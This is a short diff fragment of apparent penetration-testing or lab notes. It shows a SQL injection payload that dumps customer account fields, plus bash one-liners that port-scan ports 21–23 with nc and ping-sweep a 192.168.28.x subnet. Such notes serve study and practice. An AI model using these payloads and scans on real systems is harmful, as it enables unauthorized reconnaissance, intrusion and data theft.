@@ -115,3 +115,5 @@ product=7 UNION SELECT name,description,account FROM siteusers.customer;
 
 no creds work just ------------
 make sure to ping sweep just ping sweep that IP as /24 /18
+for i in {97..126} ;do (nc -zv 192.168.28.$i 21-23) ;done PORT SCANNING
+for i in {1..254} ;do (ping -c 1 192.168.28.$i/27 | grep "bytes from" &) ;done
